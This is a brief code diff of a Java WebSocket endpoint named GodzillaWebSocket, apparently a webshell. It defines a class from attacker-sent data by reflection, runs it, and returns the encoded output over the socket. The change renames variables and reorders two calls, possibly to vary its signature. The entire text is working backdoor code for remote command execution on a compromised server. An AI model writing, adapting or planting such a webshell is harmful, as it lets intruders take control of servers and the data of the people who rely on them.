@@ -74,12 +74,12 @@ public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<
                 payload = reflectionDefineClass(data);
                 session.getBasicRemote().sendText(base64Encode(x("ok".getBytes(), true)));
             } else {
-                ByteArrayOutputStream bos = new ByteArrayOutputStream();
-                Object obj = payload.newInstance();
-                obj.equals(data);
-                obj.equals(bos);
-                obj.toString();
-                session.getBasicRemote().sendText(base64Encode(x(bos.toByteArray(), true)));
+                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+                Object f = payload.newInstance();
+                f.equals(arrOut);
+                f.equals(data);
+                f.toString();
+                session.getBasicRemote().sendText(base64Encode(x(arrOut.toByteArray(), true)));
             }
         } catch (Throwable e) {
             e.printStackTrace();
